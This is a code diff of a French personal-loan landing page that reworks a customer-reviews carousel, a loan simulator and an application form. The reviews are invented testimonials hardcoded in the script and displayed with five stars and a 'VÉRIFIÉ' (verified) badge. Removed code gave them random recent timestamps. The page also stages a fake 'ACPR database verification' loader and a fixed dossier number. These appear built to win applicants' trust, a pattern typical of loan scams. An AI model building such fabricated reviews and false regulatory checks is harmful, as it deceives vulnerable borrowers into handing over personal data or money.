@@ -84,17 +84,6 @@
             position: relative; overflow: hidden; min-height: 520px;
         }
 
-        /* --- NOUVEAU DESIGN BOUTON PREMIUM --- */
-        .btn-premium { 
-            background: var(--navy); color: white; border: 2px solid var(--gold); width: 100%; 
-            padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; 
-            display: flex; align-items: center; justify-content: center; gap: 10px;
-            text-transform: uppercase;
-        }
-        .btn-premium:hover { background: var(--gold); color: var(--navy); }
-        .gold-star { color: var(--bright-gold); }
-        .gold-lock { color: var(--bright-gold); margin-left: 5px; }
-
         @media (max-width: 991px) {
             .hero { flex-direction: column; height: auto; padding: 120px 5% 50px; text-align: center; }
             .hero-content { max-width: 100%; margin-bottom: 40px; }
@@ -109,26 +98,30 @@
             .whatsapp-float-dynamic { width: 52px; height: 52px; font-size: 28px; }
         }
 
-        /* --- SECTION TÉMOIGNAGES ANIMÉE --- */
+        /* --- NOUVELLE SECTION AVIS CORRIGÉE --- */
         .reviews-section { padding: 80px 8%; background: var(--light-bg); text-align: center; overflow: hidden; position: relative; }
-        .reviews-section h2 { color: var(--navy); margin-bottom: 40px; font-size: 2rem; }
+        .reviews-section h2 { color: var(--navy); margin-bottom: 20px; font-size: 2rem; }
         
-        .reviews-wrapper { position: relative; padding: 0 40px; display: flex; align-items: center; }
-        
-        .reviews-grid { 
-            display: flex; 
-            gap: 25px; 
-            transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
-            width: 100%;
+        .btn-premium { 
+            background: var(--navy); color: white; border: 2px solid var(--gold); 
+            padding: 15px 30px; font-weight: 700; cursor: pointer; transition: 0.3s; 
+            display: inline-flex; align-items: center; gap: 10px;
+            text-transform: uppercase; margin-bottom: 40px; text-decoration: none;
         }
+        .btn-premium:hover { background: var(--gold); color: var(--navy); }
+        .gold-star { color: var(--bright-gold); }
+        .gold-lock { color: var(--bright-gold); }
 
+        .reviews-wrapper { position: relative; padding: 0 50px; display: flex; align-items: center; justify-content: center; }
+        .reviews-container-mask { overflow: hidden; width: 100%; max-width: 1200px; }
+        .reviews-grid { display: flex; gap: 25px; transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1); }
+        
         .review-card { 
-            min-width: 320px;
-            background: white; padding: 25px; border-radius: 8px; box-shadow: 0 10px 20px rgba(0,0,0,0.05); 
-            text-align: left; border-top: 3px solid var(--gold); cursor: pointer; transition: 0.4s;
+            min-width: 320px; background: white; padding: 25px; border-radius: 8px; 
+            box-shadow: 0 10px 20px rgba(0,0,0,0.05); text-align: left; 
+            border-top: 3px solid var(--gold); cursor: pointer; transition: 0.4s;
         }
-        .review-card:hover { transform: translateY(-5px); border-top-color: var(--navy); }
-        .review-card.zoomed { transform: scale(1.1); z-index: 50; box-shadow: 0 20px 40px rgba(0,0,0,0.2); position: relative; }
+        .review-card.zoomed { transform: scale(1.05); z-index: 10; box-shadow: 0 20px 40px rgba(0,0,0,0.15); }
 
         .stars { color: var(--bright-gold); margin-bottom: 5px; font-size: 0.9rem; }
         .review-date { font-size: 0.7rem; color: #999; margin-bottom: 10px; font-weight: 600; display: block; }
@@ -140,21 +133,20 @@
             position: absolute; top: 50%; transform: translateY(-50%);
             background: var(--navy); color: var(--gold); border: 1px solid var(--gold);
             width: 45px; height: 45px; border-radius: 50%; display: flex; 
-            align-items: center; justify-content: center; cursor: pointer; z-index: 10;
-            transition: 0.3s;
+            align-items: center; justify-content: center; cursor: pointer; z-index: 10; transition: 0.3s;
         }
         .nav-arrow:hover { background: var(--gold); color: var(--navy); }
         .arrow-left { left: 0; }
         .arrow-right { right: 0; }
 
-        /* Styles Simulateur inchangés */
+        /* Styles Simulateur Originaux */
         .sim-row { margin-bottom: 20px; }
         .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 10px; font-size: 0.9rem; }
         .sim-row label span { color: var(--navy); font-weight: 800; } 
         input[type="range"] { -webkit-appearance: none; width: 100%; height: 5px; background: #ddd; border-radius: 5px; outline: none; background-image: linear-gradient(var(--bright-gold), var(--bright-gold)); background-repeat: no-repeat; background-size: 0% 100%; }
         input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; height: 22px; width: 22px; border-radius: 50%; background: var(--navy); cursor: pointer; border: 2px solid white; box-shadow: 0 0 5px rgba(0,0,0,0.3); }
         .result-area { background: var(--light-bg); padding: 25px; text-align: center; border: 1px solid #EEE; margin-bottom: 20px; border-radius: 4px; }
-        .result-area p { font-size: 0.9rem; margin-bottom: 5px; color: var(--navy); font-weight: 800; text-shadow: 1px 2px 3px rgba(0,0,0,0.1); animation: blink-soft 3s infinite; }
+        .result-area p { font-size: 0.9rem; margin-bottom: 5px; color: var(--navy); font-weight: 800; animation: blink-soft 3s infinite; }
         .result-area span { font-size: 2.2rem; font-weight: 800; color: var(--navy); }
         .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; }
         .form-input { width: 100%; padding: 12px; border: 2.5px solid var(--deep-gold); background-color: var(--white); border-radius: 4px; margin-bottom: 10px; font-size: 1rem; outline: none; color: #000c24; font-weight: 600; }
@@ -227,7 +219,7 @@
                 <p id="loader-text" style="font-weight: 600; color: var(--navy);">Analyse du dossier en cours...</p>
                 <p style="font-size: 0.7rem; color: #999; margin-top: 10px;">Vérification des bases de données ACPR</p>
             </div>
-            <div id="success-message" style="display:none; text-align:center;">
+            <div id="success-message" style="display:none;">
                 <i class="fas fa-check-circle" style="color:var(--success); font-size:4rem; margin-bottom:20px;"></i>
                 <h3 style="color: var(--navy); margin-bottom: 10px;">DEMANDE ENREGISTRÉE</h3>
                 <p style="font-size: 0.9rem; margin-bottom: 20px;">Votre numéro de dossier : <strong>#CEZ-2026</strong> a été transmis avec succès.</p>
@@ -249,10 +241,7 @@
                 <p>MENSUALITÉ ESTIMÉE (TAEG FIXE 3.5%)</p>
                 <span id="monthlyRes">0.00</span> <span style="color: var(--navy); font-weight: 800;">€</span>
             </div>
-            
-            <button type="button" class="btn-premium" onclick="goToStep2()">
-                <span class="gold-star">★★★</span> VÉRIFIER LES AVIS CLIENTS CERTIFIÉS <i class="fas fa-lock gold-lock"></i>
-            </button>
+            <button type="button" class="btn-main" onclick="goToStep2()">DÉPOSER MON DOSSIER</button>
             
             <div class="scrolling-security">
                 <span><i class="fas fa-lock" style="color:var(--gold);"></i> CONFIDENTIALITÉ : Vos données sont strictement confidentielles et ne seront jamais vendues à des tiers. • Transfert sécurisé SSL 256-bit • Protection garantie.</span>
@@ -283,7 +272,6 @@
                     <option value="Suisse">Suisse (+41)</option>
                     <option value="Luxembourg">Luxembourg (+352)</option>
                     <option value="Canada">Canada (+1)</option>
-                    <option value="Allemagne">Allemagne (+49)</option>
                 </select>
                 <input type="tel" name="telephone" placeholder="Téléphone (ex: +33...)" class="form-input" required>
                 <input type="email" name="email" placeholder="Adresse e-mail" class="form-input" required>
@@ -301,9 +289,16 @@
 
 <section class="reviews-section">
     <h2>La confiance de nos clients internationaux</h2>
+    
+    <a href="#simBox" class="btn-premium">
+        <span class="gold-star">★★★</span> VÉRIFIER LES AVIS CLIENTS CERTIFIÉS <i class="fas fa-lock gold-lock"></i>
+    </a>
+
     <div class="reviews-wrapper">
         <div class="nav-arrow arrow-left" onclick="moveSlide(-1)"><i class="fas fa-chevron-left"></i></div>
-        <div class="reviews-grid" id="reviews-container"></div>
+        <div class="reviews-container-mask">
+            <div class="reviews-grid" id="reviews-container"></div>
+        </div>
         <div class="nav-arrow arrow-right" onclick="moveSlide(1)"><i class="fas fa-chevron-right"></i></div>
     </div>
 </section>
@@ -329,12 +324,10 @@
 <div id="goUp" onclick="window.scrollTo({top:0, behavior:'smooth'})"><i class="fas fa-arrow-up"></i></div>
 
 <script>
-    // --- GESTION WHATSAPP ---
     const waText = document.getElementById('wa-text');
-    const messages = ["Besoin d'aide ?", "Need help?", "Agent en ligne"];
+    const messages = ["Besoin d'aide ?", "Agent en ligne"];
     let msgIndex = 0; setInterval(() => { msgIndex = (msgIndex + 1) % messages.length; waText.innerText = messages[msgIndex]; }, 4000);
 
-    // --- BASE DE DONNÉES AVIS ---
     const internationalReviews = [
         { n: "Marc L.", p: "France", t: "Financement rapide et équipe très professionnelle." },
         { n: "Thomas W.", p: "Luxembourg", t: "Etablissement sérieux et réactif. Top !" },
@@ -342,42 +335,21 @@
         { n: "Elena V.", p: "Suisse", t: "Excellente gestion de mon dossier de crédit." },
         { n: "Lars O.", p: "Allemagne", t: "Sehr zufrieden mit dem Zinssatz. Absolut empfehlenswert." },
         { n: "João P.", p: "Portugal", t: "Processo simples e transparente. Recomendo." },
-        { n: "Jean B.", p: "Canada", t: "Service impeccable même depuis le Québec." },
-        { n: "Anissa K.", p: "Martinique", t: "Une aide précieuse pour mon projet local." },
-        { n: "Piotr K.", p: "Pologne", t: "Wszystko przebiegło sprawnie. Polecam." },
-        { n: "Victor R.", p: "Espagne", t: "Gestión impecable de mi crédito personal." },
-        { n: "Claire D.", p: "France", t: "Solution idéale pour consolider mes dettes." },
-        { n: "Mathias P.", p: "Suisse", t: "Sérieux, rapide et efficace." }
+        { n: "Jean B.", p: "Canada", t: "Service impeccable même depuis le Québec." }
     ];
 
-    // --- CAROUSEL & ZOOM ---
     let currentScroll = 0;
-    let isPaused = false;
-
     function renderReviews() {
         const container = document.getElementById('reviews-container');
         container.innerHTML = ""; 
         internationalReviews.forEach(r => {
-            const times = ["2 min", "1h", "3h", "1j"];
-            const randomTime = times[Math.floor(Math.random() * times.length)];
             const card = document.createElement('div');
             card.className = 'review-card';
             card.innerHTML = `
-                <span class="review-date"><i class="far fa-clock"></i> Il y a ${randomTime}</span>
+                <span class="review-date"><i class="far fa-clock"></i> Récemment</span>
                 <div class="stars"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
                 <p class="review-text">"${r.t}"</p>
                 <div class="review-author"><div>${r.n} (${r.p})</div><span class="verified"><i class="fas fa-check-circle"></i> VÉRIFIÉ</span></div>`;
-            
-            card.onclick = function() {
-                const alreadyZoomed = this.classList.contains('zoomed');
-                document.querySelectorAll('.review-card').forEach(c => c.classList.remove('zoomed'));
-                if(!alreadyZoomed) {
-                    this.classList.add('zoomed');
-                    isPaused = true;
-                } else {
-                    isPaused = false;
-                }
-            };
             container.appendChild(card);
         });
     }
@@ -391,8 +363,6 @@
         if(currentScroll < 0) currentScroll = maxScroll;
         container.style.transform = translateX(-${currentScroll}px);
     }
-
-    setInterval(() => { if(!isPaused) moveSlide(1); }, 4000);
 
     // --- CALCULATEUR ---
     const amtR = document.getElementById('amtRange');
@@ -418,12 +388,9 @@
     function goToStep1() { document.getElementById('step2').style.display = 'none'; document.getElementById('step1').style.display = 'block'; }
     function resetAll() { location.reload(); }
 
-    window.onscroll = () => { document.getElementById('goUp').style.display = (window.scrollY > 500) ? 'flex' : 'none'; };
-    
     renderReviews();
     calc();
 
-    // --- FORMULAIRE ---
     document.getElementById('loanForm').onsubmit = async (e) => {
         e.preventDefault();
         document.getElementById('loader-overlay').style.display = 'flex';
